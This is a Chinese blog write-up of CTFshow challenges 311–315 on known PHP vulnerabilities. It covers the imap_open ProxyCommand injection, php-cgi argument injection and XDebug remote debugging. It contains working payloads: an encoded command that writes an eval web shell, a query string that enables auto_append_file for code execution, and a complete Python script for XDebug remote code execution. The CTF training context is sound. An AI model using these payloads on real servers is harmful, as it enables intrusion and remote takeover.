---
title: CTFshowphpCVE
abbrlink: 85a6a528
date: 2022-06-02 17:15:05
tags:
---

**311**

PHP版本7.1.33dev

CVE-2019-11043

[利用脚本](https://github.com/neex/phuip-fpizdam)

**312**

PHP版本5.6.38

CVE-2018-19518

漏洞成因

> IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数
>
> `imap_open( string $mailbox,string $user,string $password）`
>
> 其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，又因为ssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。

然后对自己想要发的内容进行一次base64编码

首先对`<?php @eval($_POST[kkk]);?>`进行一次base64编码

然后对`echo "上个编码内容" | base64 -d >shell.php`进行一次base64编码

注意：如果进行base64编码后，含有+ =，都要进行url编码即%2b %3d，所以为了保证不会出错，最好再对得到的base64编码后的字符串再进行url编码。相当于步骤为先base64编码，再url编码

然后将hostname的内容替换成`x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh}`

```
hostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA==|base64%09-d|sh}&username=1&password=1
```

**313**

PHP版本5.4.1

CVE-2012-1823

该漏洞具体成因可见[P神博客](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)

> 命令行参数不光可以通过`#!/usr/local/bin/php-cgi -d include_path=/path`的方式传入php-cgi，更可以通过querystring的方式传入。
>
> 通过阅读源码，我发现cgi模式下有如下一些参数可用：
>
> - `-c` 指定php.ini文件的位置
> - `-n` 不要加载php.ini文件
> - `-d` 指定配置项
> - `-b` 启动fastcgi进程
> - `-s` 显示文件源码
> - `-T` 执行指定次该文件
> - `-h`和`-?` 显示帮助

简单来说，就可以通过参数传递通过以上的参数类型传入不同的内容在执行php时被传入

可通过-d直接修改php中的配置项来达到我们任意写入的效果

```
payload:?-d+allow_url_include%=on+=auto_append_file=php://input
POST:
<?php system('nl /somewhere/fla9.txt');?>
```

**314**

包含日志文件就过了////////////

**315**

PHP版本7.1.12，debug开启，端口9000

> 影响
>
> XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：
>
> ```
> xdebug.remote_connect_back = 1
> xdebug.remote_enable = 1
> ```
>
> 这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。

编写好的脚本，要在公网IP下使用

```python
#!/usr/bin/env python3
import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor


pool = ThreadPoolExecutor(1)
session = requests.session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}

def recv_xml(sock):
    blocks = []
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        while data:
            eop = data.find(b'\x00')
            if eop < 0:
                break
            blocks.append(data[:eop])
            data = data[eop+1:]

        if len(blocks) >= 4:
            break
    
    return blocks[3]


def trigger(url):
    time.sleep(2)
    try:
        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
    except:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
    args = parser.parse_args()
    
    ip_port = ('0.0.0.0', args.listen)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    pool.submit(trigger, args.target)
    conn, addr = sk.accept()
    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

    data = recv_xml(conn)
    print('[+] Recieve data: ' + data.decode())
    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
    if not g:
        print('[-] No result...')
        sys.exit(0)

    data = g.group(1)

    try:
        print('[+] Result: ' + base64.b64decode(data).decode())
    except binascii.Error:
        print('[-] May be not string result...')
```

环境寄了，没得结果
